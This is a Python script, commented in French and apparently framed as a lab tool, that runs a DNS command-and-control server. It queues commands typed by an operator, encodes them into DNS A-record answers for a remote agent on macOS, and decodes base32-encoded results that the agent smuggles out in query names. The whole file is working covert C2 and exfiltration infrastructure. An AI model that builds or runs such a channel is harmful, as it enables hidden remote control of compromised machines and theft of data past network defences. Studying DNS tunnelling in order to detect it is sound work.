#!/usr/bin/env python3
# language: Python 3, file: star_dns_c2_server.py, target: macOS
# S.T.A.R. Labs - serveur DNS de commandes : les taches voyagent dans les reponses DNS
# Usage: python3 star_dns_c2_server.py [port]   (5353 par defaut - lab)
# Protocol: queries "b32data.task.starlab" -> answer A = ip encodee par octet
import socket, base64, sys, time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5353
QUEUE = []          # taches en attente (tapees au clavier)
RESULTS = {}

def encode_ip(cmd: str) -> str:
    """les 4 premiers octets de la commande voyagent dans la reponse A (lab)"""
    raw = cmd.encode()[:4].ljust(4, b"\0")
    return ".".join(str(b) for b in raw)

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORT))
    print(f"[*] serveur DNS C2 sur :{PORT} - tape une commande a envoyer a l agent, entree pour l emettre")
    import threading
    try:
        threading.Thread(target=lambda: [QUEUE.append(input()) for _ in iter(int, 1)], daemon=True).start()
    except EOFError:
        pass
    while True:
        data, addr = s.recvfrom(512)
        if len(data) < 14: continue
        print("    [HEX]", data[:32].hex(), flush=True)
        # parse question
        i = 12
        labels = []
        while i < len(data) and data[i]:
            n = data[i]
            if i + 1 + n > len(data): break
            labels.append(data[i+1:i+1+n].decode(errors="ignore"))
            i += 1 + n
        if i + 4 > len(data): continue
        qname = ".".join(labels)
        print(f"    [DNS] {addr[0]} -> {qname}", flush=True)
        # reponse: copie header + question, section answer A
        tid = data[:2]
        qd = data[12:i]
        if "result." in qname:
            chunk = qname.split(".")[0]
            try:
                results_txt = base64.b32decode(
                    chunk + "=" * ((8 - len(chunk) % 8) % 8)).decode(errors="ignore")
                print(f"[<-] resultat de l agent : {results_txt[:200]}")
                RESULTS[time.time()] = results_txt
            except Exception as e:
                print(f"    [!] resultat indecodable : {e}")
            ip_enc = encode_ip("")
        else:
            cmd = QUEUE.pop(0) if QUEUE else ""
            ip_enc = encode_ip(cmd)
            if cmd:
                print(f"[->] tache emise : {cmd}")
        answer = (b"\xc0\x0c" if True else b"")  # pointeur vers la question
        rr = answer + bytes([0, 1, 0, 1, 0, 0, 0, 60, 0, 4]) + bytes(int(x) for x in ip_enc.split("."))
        reply = tid + bytes([0x81, 0x80]) + data[4:6] + b"\x00\x01\x00\x01\x00\x00\x00\x00" + qd + rr
        s.sendto(reply, addr)

if __name__ == "__main__":
    main()
